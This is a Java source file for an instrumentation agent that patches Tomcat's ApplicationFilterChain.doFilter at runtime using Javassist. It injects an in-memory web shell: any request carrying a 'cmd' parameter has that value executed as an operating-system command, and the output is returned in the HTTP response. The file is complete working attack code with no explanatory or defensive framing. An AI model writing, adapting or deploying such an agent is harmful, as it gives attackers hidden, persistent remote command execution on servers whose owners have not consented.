package com.soytn1ce.attach;

import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtMethod;

import java.lang.instrument.ClassFileTransformer;
import java.lang.instrument.IllegalClassFormatException;
import java.lang.instrument.Instrumentation;
import java.security.ProtectionDomain;

public class Agent {
    public static final String ClassName = "org.apache.catalina.core.ApplicationFilterChain";

    public static void agentmain(String agentArgs, Instrumentation inst) throws Exception{
        inst.addTransformer(new ClassFileTransformer() {
            @Override
            public byte[] transform(ClassLoader loader, String className, Class<?> classBeingRedefined, ProtectionDomain protectionDomain, byte[] classfileBuffer) throws IllegalClassFormatException {
                className = className.replace("/",".");
                if(className.equals(ClassName)){
                    System.out.println("find inject class:" + className);
                    ClassPool pool = ClassPool.getDefault();
                    try{
                        CtClass c = pool.getCtClass(className);
                        CtMethod m = c.getDeclaredMethod("doFilter");
                        m.insertBefore("javax.servlet.http.HttpServletRequest req =  request;\n" +
                                "javax.servlet.http.HttpServletResponse res = response;\n" +
                                "java.lang.String cmd = request.getParameter(\"cmd\");\n" +
                                "if (cmd != null){\n" +
                                "    try {\n" +
                                "        java.io.InputStream in = Runtime.getRuntime().exec(cmd).getInputStream();\n" +
                                "        java.io.BufferedReader reader = new java.io.BufferedReader(new java.io.InputStreamReader(in));\n" +
                                "        String line;\n" +
                                "        StringBuilder sb = new StringBuilder(\"\");\n" +
                                "        while ((line=reader.readLine()) != null){\n" +
                                "            sb.append(line).append(\"\\n\");\n" +
                                "        }\n" +
                                "        response.getOutputStream().print(sb.toString());\n" +
                                "        response.getOutputStream().flush();\n" +
                                "        response.getOutputStream().close();\n" +
                                "    } catch (Exception e){\n" +
                                "        e.printStackTrace();\n" +
                                "    }\n" +
                                "}");
                        byte[] bytes=c.toBytecode();
                        c.detach();
                        return bytes;
                    }catch (Exception e){
                        e.printStackTrace();
                    }
                }
                return new byte[0];
            }
        });
    }
}
